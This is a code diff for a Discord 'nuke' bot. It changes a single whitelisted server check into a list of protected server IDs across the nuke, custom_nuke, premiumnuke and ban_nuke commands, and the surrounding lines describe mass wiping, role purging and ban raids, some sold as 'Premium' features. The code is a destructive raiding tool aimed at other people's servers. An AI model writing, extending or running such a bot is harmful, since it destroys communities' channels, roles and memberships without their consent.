@@ -534,7 +534,7 @@ async def purge_roles_slash(interaction: discord.Interaction):
 @client.tree.command(name="premiumnuke", description="Wipe with custom settings (Premium Only)")
 @app_commands.describe(message="Custom message", channel_name="Custom channels")
 async def premiumnuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
@@ -584,7 +584,7 @@ async def nickname_all_slash(interaction: discord.Interaction, nickname: str):
 async def ban_nuke_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
+    if interaction.guild_id in WHITELISTED_SERVER_IDS:
         return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
     
     await interaction.response.defer(ephemeral=True)
@@ -642,14 +642,14 @@ async def announce_slash(interaction: discord.Interaction, title: str, message: 
 
 @client.command()
 async def nuke(ctx):
-    if ctx.guild.id == WHITELISTED_SERVER_ID:
+    if ctx.guild.id in WHITELISTED_SERVER_IDS:
         return await ctx.send("❌ This server is protected from nuking!")
     print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
     await nuke_guild(ctx.guild)
 
 @client.command()
 async def custom_nuke(ctx, message: str, channel_name: str = None):
-    if ctx.guild.id == WHITELISTED_SERVER_ID:
+    if ctx.guild.id in WHITELISTED_SERVER_IDS:
         return await ctx.send("❌ This server is protected from nuking!")
     if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
         return await ctx.send("❌ Premium Only!")
